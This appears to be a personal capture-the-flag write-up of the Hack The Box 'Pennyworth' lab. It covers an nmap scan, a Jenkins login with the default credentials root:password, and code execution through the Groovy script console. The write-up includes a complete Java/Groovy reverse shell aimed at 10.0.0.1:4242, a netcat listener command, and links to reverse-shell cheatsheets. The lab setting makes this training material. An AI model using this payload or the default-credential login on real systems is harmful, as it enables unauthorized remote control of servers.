
27-09-2024 14:28 pm

Tags: [[Common Applications]] [[Jenkins]] [[Java]] [[Recon|Recon]] [[Remote Code Execution]] [[Default Credentials]] [[Groovy]]

References: https://app.hackthebox.com/starting-point


# Pennyworth

- scan with NMAP
- on TCP 8080 there is a web application
- Jenkins is discovered (Jenkins 2.289.1)
- check different default credentials and find `root:password`
- search for CVEs online with no result
- fortunately we have the links in the "Useful Links" section
- we get a reverse shell for Java from the cheatsheet (it works for Groovy)
Shell:
```shell-session
String host="10.0.0.1";
int port=4242;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
- the reverse shell can be uploaded on `/script`
- before running the script execute `nc -lvnp <port>` to listen for the reverse shell
- run the Groovy script
- cd `root` -> cat `flag.txt`
- GG B^)







# Useful Links:

https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security
https://github.com/gquere/pwn_jenkins
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md //Reverse shell cheatsheet